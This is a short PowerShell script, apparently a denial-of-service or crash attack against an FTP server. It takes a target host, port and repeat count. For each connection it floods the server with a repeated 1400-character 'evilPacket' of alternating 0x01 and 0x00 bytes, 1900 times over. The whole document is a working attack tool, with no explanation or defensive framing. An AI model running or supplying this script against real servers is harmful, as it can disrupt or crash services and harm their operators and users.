$FTPServer = $args[0];
$FTPPort = $args[1];
$number = $args[2]

for($a = 0; $a -lt $number; $a++){
    $tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort);
    $tcpStream = $tcpConnection.GetStream();
    $reader = New-Object System.IO.StreamReader($tcpStream);
    $writer = New-Object System.IO.StreamWriter($tcpStream);
    $writer.AutoFlush = $true;
    $buffer = new-object System.Byte[] 1024;
    $encoding = new-object System.Text.AsciiEncoding;
    
    $evilPacket = new-object System.Char[] 1400;
    for($i=0; $i -lt 1400; $i+=2){
        $evilPacket[$i] = [char]0x0001;
        $evilPacket[$i+1] = [char]0x0000;
    }
    
    for($i=0; $i -lt 1900; $i++){
        $writer.Write($evilPacket);
    }
    
    $reader.Close();
    $writer.Close();
    $tcpConnection.Close();
}

